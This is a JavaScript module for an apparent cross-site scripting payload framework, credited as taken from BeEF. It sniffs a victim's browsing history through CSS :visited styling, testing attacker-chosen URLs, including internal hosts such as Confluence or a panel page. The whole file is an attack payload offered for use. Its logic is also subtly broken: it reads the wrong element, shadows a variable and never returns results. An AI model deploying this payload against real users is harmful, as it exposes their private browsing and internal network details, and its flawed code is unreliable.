// ripped from BEEF
// send urls in the "urls" parameter space separated
function check_urls(urls)
{
    var results = new Array();
	/*
    var iframe = xss.ce("iframe");
	console.log(iframe);
    var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
    ifdoc.open();
    ifdoc.write('<style>a:visited{width:0px !important;}</style>');
    ifdoc.close();
	*/

	var st = xss.ce("style");
	st.appendChild(document.createTextNode(""));
	document.head.appendChild(st);
	st.sheet.addRule("a:visited", "color:red;width:0;border: 1px soild #000;", 0);

	//xss.append("<style>a.x{color:red;width:0;}</style>");

	// split the urls by space
    urls = urls.split(" ");

	xss.dbg("testing #" + urls.length + " urls");
    for (var i in urls) {
        var url = urls[i];
        if (url) {
			console.log("test: " + url);
            var success = false;
            var a = xss.ce('a');
            //a.href = "http://"+url;
            a.href = url;
			a.className = "x";
			a.id = "vu";
			a.style="color:green;";
			a.innerHTML = url;
			//console.log(a);
			xss.getdiv().appendChild(a);

            var width = "";
			for(var z=0;z<10000;z++) { var a = 1; }
			//var vu = document.getElementById("vu");
			var vu = document.getElementById("pan");
			console.log(vu);

			if (vu.currentStyle) {
				console.log("have current style");
				width = a.currentStyle['width'];
			} else {
				//console.log("computing style");
				var f = document.defaultView.getComputedStyle(vu, null);
				console.log(f);
				if (f) {
					var width = f.getPropertyValue("width");
					var color = f.getPropertyValue("color");
					var border = f.getPropertyValue("border");
					console.log(width + " / " + color + " - " + border);
				}
			}
            //(a.currentStyle) ? width = a.currentStyle['width'] : width = document.getComputedStyle(a, null).getPropertyValue("width");
			//console.log(a);
			console.log("width: " + width);
            if (width == '0px') {
                success = true;
				xss.dbg(url + " visited");
            }
			xss.rm("vu");

            //results.push({'url':u, 'visited':success});
        }
    }
	xss.cls();
	xss.dbg("finished");
}

//var urls = xss.opt("urls", "the urls to test, space separated", "wiki docuwiki mail webmail");
//var urls = xss.opt("urls", "the urls to test, space separated", "http://confluence http://confluence/ http://fobar");
var urls = xss.opt("urls", "the urls to test, space separated", "/panel.html http://fobar");
check_urls(urls);
